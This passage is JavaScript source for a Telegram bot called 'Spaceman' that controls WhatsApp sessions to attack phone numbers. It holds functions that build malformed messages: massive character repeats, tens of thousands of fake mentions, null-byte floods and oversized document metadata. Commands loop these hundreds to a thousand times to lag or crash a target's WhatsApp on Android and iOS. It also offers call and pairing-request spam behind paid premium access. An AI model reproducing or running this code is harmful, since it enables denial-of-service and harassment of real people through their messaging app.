            "title": "🎭⃟༑⌁⃰ཀ‌‌🐉",
            "sections": [{
             "title": "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n",
             "rows": []
            }]
           }
          },
          {
           name: "call_permission_request",
           buttonParamsJson: venomModsData + "\u0100"
          }
         ],
        },
       }
      }
     }
    }), {
     userJid: target,
     quoted: null // di ganti null atau yng lain jg bisa kalau ga kefiend
    }
   );
   await sock.relayMessage(target, etc.message, {
    participant: {
     jid: target
    }
   });
}
  
async function SpacemanIOS(isTarget) {
sock.relayMessage(
    isTarget,
    {
        extendedTextMessage: {
            text: `𑲭𑲭👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻  ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: null,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "O CRASHER - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: null,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    {
              participant: {
                  jid: isTarget
              }
          }       
);
}

async function SpacemanNotif(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 " + "ꦽ".repeat(120000) + "@0".repeat(90000),
    contextInfo: {
      stanzaId: target,
      participant: "5521992999999@s.whatsapp.net", 
      quotedMessage: {
        conversation: "*Ios Ya Mas?* " + "ꦾ࣯࣯".repeat(120000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function SpacemanSletter(isTarget) {
  const msg = generateWAMessageFromContent(isTarget, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "Fuck You Ireng🤓"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "spaceman_xgen",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: venomModsData + "\u0000".repeat(10000)
      }
   }
  }, { userJid: isTarget });

  await sock.relayMessage(isTarget, msg.message, { 
    participant: { jid: isTarget },
    messageId: msg.key.id 
  });
}

async function SpacemanCarousel(target) {
for (let i = 0; i < 15; i++) {
    const cards = Array.from({ length: 1000 }, () => ({
      body: { text: '👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n\n' }, // Zero Width Space
      footer: { text: '\u0000' },
      header: {
        title: '👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻',
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          fileLength: "9741",
          height: 0,
          width: 0,
          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail: "/9j/..." // tetap valid, walau invisible
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              header: "\u200B",
              body: "\u200B",
              flow_action: "navigate",
              flow_action_payload: { screen: "FORM_SCREEN" },
              flow_cta: "\u200B",
              flow_id: "1169834181134583",
              flow_message_version: "3",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
            })
          }
        ]
      }
    }));

    const carousel = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: { text: '👾 𝗦͠𝗽͢𝗮͜𝗰͟𝗲͠𝗺͢𝗮͜𝗻 \n' + "ꦽ".repeat(120000) + "@1".repeat(90000) },
            footer: { text: 'xnxx.com' },
            header: { hasMediaAttachment: false },
            carouselMessage: { cards }
          }
        }
      }
    }, { userJid: target });

    await sock.relayMessage(target, carousel.message, { participant: { jid: target }, messageId: carousel.key.id });
}
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  const waktuRunPanel = getUptime();
  const caption = `
\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧
𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧 (👾) - Olá ${sender} — Telegram — Whatsapp — வாட்ஸ்அப் அமைப்பை எளிதில் அழிக்கும் டெலிகிராம் பாட்<

「 🚀🚀𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧 🥵🥶 ☇ 𝐂͜𝐨͢𝐫͜𝐞˚𝐒͢𝐲͜𝐬͡𝐭͢𝐞͜𝐦 」

— Author : 𝓔XGØØD | × OZZY | THOMAS |
— Version : 2.0
— Language : JavaScript 
— Prefix : /
— Interface : Button Type
— Type : ( Plugins )
— Runtime : ${waktuRunPanel}
— Date : ${new Date().toLocaleString("en-GB", { timeZone: "Asia/Jakarta" })}

( ! ) — Select The Button Menu Below
\`\`\`
`;

  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 ᄓ̻𝐂𝐇͢͠𝐀𝐍̻͡𝐍𝐄̻ͯ𝐋͡ ☇ 𝐃𝐄𝐕 」", url: "https://t.me/+9CKn2xR01KhiZWU1" }],
        [
          { text: "「 ᄓ̻𝐁𝐔͢͠𝐆̻͡ ☇ 𝐌𝐄̻ͯ𝐍͡𝐔 」", callback_data: "bug_menu" },
          { text: "「 ᄓ̻𝐎𝐖͢͠𝐍𝐄̻͡𝐑̻ͯ ☇ 𝐌𝐄𝐍͡𝐔 」", callback_data: "owner_menu" }
        ],
        [{ text: "「 ᄓ̻𝐒𝐏͢͠𝐀𝐌̻͡ ☇ 𝐌𝐄̻ͯ𝐍͡𝐔 」", callback_data: "spam_menu"}],
       [{ text: "「 ᄓ̻𝐓𝐇͢͠𝐀𝐍̻͡𝐊̻ͯ𝐒͡ ☇ 𝐓𝐎 」", callback_data: "tqto" }]
      ]
    }
  });
});


bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;

  if (data === 'bug_menu') {
    const bugCaption = `
\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧
🚀🚀B U G - S E L E C T I O N🥶🥵
──────────────────────────

#- Delay V1
— /Spaceman-ComboV1 628xxxxxx
╰➤ Delay maksimal, menyedot kuota target.

#- Delay V2🚀🚀
— /Spaceman-ComboV2 62xxxx
╰➤ Delay super maksimal, membuat target lag.

#- Delay V3🚀🚀
— /Spaceman-ComboV3 628xxxxxx
╰➤ Delay tingkat lebih lanjut.

#- Android Crash🚀🚀 [ SPAM TYPE ]
— /Spaceman-Overload 628xxxxxx
╰➤ Crash/Blank WhatsApp target.

#- Ios Trick🚀🚀 [ SPAM TYPE ]
— /Spaceman-IosX 628xxxxxx
╰➤ Crash Whatsapp IOS target.

Note: Sesuaikan huruf / cmd  yang kalian mau coba !
\`\`\`
`;

    await bot.editMessageCaption(bugCaption, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 ᄓ̻𝐊𝐄͢͠𝐌̻͡𝐁𝐀̻ͯ𝐋͡ 𝐈 」", callback_data: "back_to_menu" }]
        ]
      }
    });
  } else if (data === 'owner_menu') {
    const ownerCaption = `
\`\`\`Spaceman(👾)
🥶🥵O W N E R - M E N U🥶🥵
──────────────────────────
— /addsender <nomor>
╰➤ Menambahkan sender bot

— /listsender
╰➤ Melihat sender bot

— /addprem <id>
╰➤ Menambahkan akses pada user

— /delprem <id>
╰➤ Menghapus akses pada user

Note: Sesuaikan huruf kapital dan kecilnya dengan perintah nya !
\`\`\`
`;

    await bot.editMessageCaption(ownerCaption, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 ᄓ̻𝐊𝐄͢͠𝐌̻͡𝐁𝐀̻ͯ𝐋͡ 𝐈 」", callback_data: "back_to_menu" }]
        ]
      }
    });
  } else if (data === 'back_to_menu') {
  const sender = msg.from.id;
  const waktuRunPanel = getUptime();
    const mainCaption = `
\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧
𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧 (👾) - Olá ${sender} — Telegram — Whatsapp — வாட்ஸ்அப் அமைப்பை எளிதில் அழிக்கும் டெலிகிராம் பாட்<

「 🚀🚀𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧 🥵🥶 ☇ 𝐂͜𝐨͢𝐫͜𝐞˚𝐒͢𝐲͜𝐬͡𝐭͢𝐞͜𝐦 」

— Author : 𝓔XGØØD | × OZZY | THOMAS | TEPZ
— Version : 2.0
— Language : JavaScript 
— Prefix : /
— Interface : Button Type
— Type : ( Plugins )
— Runtime : ${waktuRunPanel}
— Date : ${new Date().toLocaleString("en-GB", { timeZone: "Asia/Jakarta" })}

( ! ) — Select The Button Menu Below
\`\`\`
`;

    await bot.editMessageCaption(mainCaption, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 ᄓ̻𝐂𝐇͢͠𝐀𝐍̻͡𝐍𝐄̻ͯ𝐋͡ ☇ 𝐃𝐄𝐕 」", url: "https://t.me/+9CKn2xR01KhiZWU1" }],
          [
            { text: "「 ᄓ̻𝐁𝐔͢͠𝐆̻͡ ☇ 𝐌𝐄̻ͯ𝐍͡𝐔 」", callback_data: "bug_menu" },
            { text: "「 ᄓ̻𝐎𝐖͢͠𝐍𝐄̻͡𝐑̻ͯ ☇ 𝐌𝐄𝐍͡𝐔 」", callback_data: "owner_menu" }
          ],
          [{ text: "「 ᄓ̻𝐒𝐏͢͠𝐀𝐌̻͡ ☇ 𝐌𝐄̻ͯ𝐍͡𝐔 」", callback_data: "spam_menu"}],
          [{ text: "「 ᄓ̻𝐓𝐇͢͠𝐀𝐍̻͡𝐊̻ͯ𝐒͡ ☇ 𝐓𝐎 」", callback_data: "tqto" }]
        ]
      }
    });
  } else if (data === 'tqto') {
    const mainCaption = `
\`\`\`Spaceman(👾)
T H A N K S - T O
──────────────────────────
— 𝓔XGØØD [ DEV ]
— OZZY [ DEV ]
— THOMAS [ MODERATOR/MANAGER ]
— ALL PENGGUNA SC SPACEMAN
\`\`\`
`;

    await bot.editMessageCaption(mainCaption, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 ᄓ̻𝐊𝐄͢͠𝐌̻͡𝐁𝐀̻ͯ𝐋͡ 𝐈 」", callback_data: "back_to_menu" }]
        ]
      }
    });
   } else if (data == 'spam_menu') {
    const spamCaption = `
\`\`\`Spaceman(👾)
🚀🚀S P A M - M E N U🥶🥵
──────────────────────────

#- Spam Telepon🚀🚀 [ Rawan Kenon ]
— /Spaceman-SpamCall 628xxxxxx
╰➤ Membuat target terganggu dengan spam telpon anda.

#- Spam Pairing🚀🚀
— /Spaceman-SpamPairing 628xxxxxx
╰➤ Membuat target terganggu dengan spam pairing perangkat.

Note: Sesuaikan huruf / cmd  yang kalian mau coba !
\`\`\`
`;

    await bot.editMessageCaption(spamCaption, {
      chat_id: msg.chat.id,
      message_id: msg.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 ᄓ̻𝐊𝐄͢͠𝐌̻͡𝐁𝐀̻ͯ𝐋͡ 𝐈 」", callback_data: "back_to_menu" }]
        ]
      }
    });
  }
  await bot.answerCallbackQuery(callbackQuery.id);
});

//========================================================\\ 
bot.onText(/\/addsender(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫Lu Bukan Owner Bang!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "🚫 Pakai Code Negara Bang\nContoh Nih Broo: /addsender 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "🚫 Contoh Nih Broo : /addsender 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});
bot.onText(/\/listsender(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫Lu Bukan Owner Bang!!!")
  }
  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
    let botList =
      `╭─────────────────\n│    *DAFTAR BOT*    \n│────────────────\n`;
    let index = 1;

    for (const [number, sock] of sessions.entries()) {
      const status = sock.user ? "Terhubung" : "Tidak Terhubung";
      botList += `│ ${index}. ${number}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total: ${sessions.size} bot\n╰─────────────────`;

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
}); 

bot.onText(/\/Spaceman-ComboV1(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-ComboV1 62×××._", { parse_mode: "Markdown" });
  
  const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }

  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-ComboV1 62×××._", { parse_mode: "Markdown" });

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target   : ${numberTarget}
– Comand   : Spaceman-V1
– Status   : ✓ Success Mengirim Bug!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    for (let i = 0; i < 1000; i++) {
    await Protocol8(formatedNumber);
    await Protocol3(formatedNumber);
    await stunnerBugMP4(formatedNumber);
    await Protocol3(formatedNumber);
    await InvasionX1(formatedNumber);
    await delayMention(formatedNumber);
    await InvasionX2(formatedNumber);
    await InvasionButton(formatedNumber);
    await sleep(4000);
  }
});
bot.onText(/\/Spaceman-ComboV2(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-ComboV2 62×××._", { parse_mode: "Markdown" });
  
  const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }

  
  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-ComboV2 62×××._", { parse_mode: "Markdown" });

  const formatedNumber = numberTarget + "@s.whatsapp.net";


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target   : ${numberTarget}
– Comand   : Spaceman-V2
– Status   : ✓ Success Mengirim Bug!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    // Langsung spam
  for (let i = 0; i < 1000; i++) {
    await bulldozer(formatedNumber);
    await stunnerBugMP4(formatedNumber);
    await bulldozer(formatedNumber);
    await InvasionX1(formatedNumber);
    await InvasionX2(formatedNumber);
    await delayInfinity(formatedNumber);
    await Protocol8(formatedNumber);
    await delayMention(formatedNumber);
    await InvasionButton(formatedNumber);
    await sleep(4000);
  }
});
bot.onText(/\/Spaceman-ComboV3(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-ComboV3 62×××._", { parse_mode: "Markdown" });
  
 const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }


  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-ComboV3 62×××._", { parse_mode: "Markdown" });
// Tetapkan cooldown baru  
const formatedNumber = numberTarget + "@s.whatsapp.net";


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target   : ${numberTarget}
– Comand   : Spaceman-V3
– Status   : ✓ Success Mengirim Bug!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    for (let i = 0; i < 1000; i++) {
    await protocolbug5(formatedNumber);
    await stunnerBugMP4(formatedNumber);
    await protocolbug5(formatedNumber);
    await InvasionX1(formatedNumber);
    await Protocol8(formatedNumber);
    await delayInfinity(formatedNumber);
    await InvasionX2(formatedNumber);
    await InvasionButton(formatedNumber);
    await delayMention(formatedNumber);
    await sleep(4000);
  }
});
bot.onText(/\/Spaceman-Overload(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-Overload 62×××._", { parse_mode: "Markdown" });
  
  
  const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }
  
  
  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-Overload 62×××._", { parse_mode: "Markdown" });
  
  const formatedNumber = numberTarget + "@s.whatsapp.net";


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target   : ${numberTarget}
– Comand   : Spaceman-Overload
– Status   : ✓ Success Mengirim Bug!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    // Langsung spam
  for (let i = 0; i < 200; i++) {
    await CrlButton(formatedNumber);
    await SpacemanCall(formatedNumber);
    await SpacemanSletter(formatedNumber);
    await CrlButtonX2(formatedNumber);
    await SpacemanFloods(formatedNumber);
    await SpacemanOld(formatedNumber);
    await SpacemanCarousel(formatedNumber);
    await SpacemanSpamNotif(formatedNumber);
    await CrlButton(formatedNumber);
    await SpacemanDoc(formatedNumber);
    await SpacemanNotif(formatedNumber);
    await SpacemanInvis(formatedNumber);
    await SpacemanXButton(formatedNumber);
    await sleep(5000);
  }
});
bot.onText(/\/Spaceman-IosX(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-IosX 62×××._", { parse_mode: "Markdown" });
  
  
  const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }

  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-IosX 62×××._", { parse_mode: "Markdown" });
  
  
  const formatedNumber = numberTarget + "@s.whatsapp.net";


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target   : ${numberTarget}
– Comand   : Spaceman-IosX
– Status   : ✓ Success Mengirim Bug!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    // Langsung spam
  for (let i = 0; i < 200; i++) {
    await SpacemanCall(formatedNumber);
    await CrlButtonX2(formatedNumber);
    await CrlButton(formatedNumber);
    await SpacemanDoc(formatedNumber);
    await SpacemanInvis(formatedNumber);
    await SpacemanSletter(formatedNumber);
    await SpacemanSpamNotif(formatedNumber);
    await CrlButton(formatedNumber);
    await SpacemanNotif(formatedNumber);
    await SpacemanXButton(formatedNumber);
    await SpacemanIOS(formatedNumber);
    await SpacemanCarousel(formatedNumber);
    await SpacemanFloods(formatedNumber);
    await sleep(5000);
  }
});

bot.onText(/\/Spaceman-SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (!sock && !whatsappStatus) return bot.sendMessage(chatId, "*🚫 Harap Hubungkan Nomor WhatsApp Anda.*", { parse_mode: "Markdown" });
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
  if (!match[1]) return bot.sendMessage(chatId, "*🚫 Masukin Nomor Yang Bener*\n_Contoh Nih : /Spaceman-SpamCall 628xxxxxx._", { parse_mode: "Markdown" });
  const check = isUserInCooldown(senderId);
  if (check.inCooldown) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${check.remaining} detik sebelum mengirim pesan lagi.`);
  }

  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) return bot.sendMessage(chatId, "*🚫 Gagal Bro, Coba Ulang*\n_Contoh : /Spaceman-SpamCall 628xxxxxx._", { parse_mode: "Markdown" });
  const formatedNumber = numberTarget + "@s.whatsapp.net";


  // Kirim foto dengan caption markdown
  await bot.sendPhoto(chatId, "https://files.catbox.moe/kzkwdn.jpg", {
    caption: `\`\`\`𝐒𝐩𝐚𝐜𝐞𝐦𝐚𝐧👾
– Target : ${numberTarget}
– Comand   : Spaceman-SpamCall
– Status   : ✓ Success Mengirim Spam!
\`\`\``,
    parse_mode: "Markdown"
  });
  cooldowns.set(senderId, Date.now() + defaultCooldowns * 1000);
    // Langsung spam
  for (let i = 0; i < 100; i++) {
    await SpamCall(formatedNumber);
    await sleep(3000);
  }
});
bot.onText(/\/Spaceman-SpamPairing(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  
  if (!premiumUsers.includes(senderId) && !owner.includes(senderId)) return bot.sendMessage(chatId, "*🚫 Lu Bukan Premium Idiot!!!*", { parse_mode: "Markdown" });
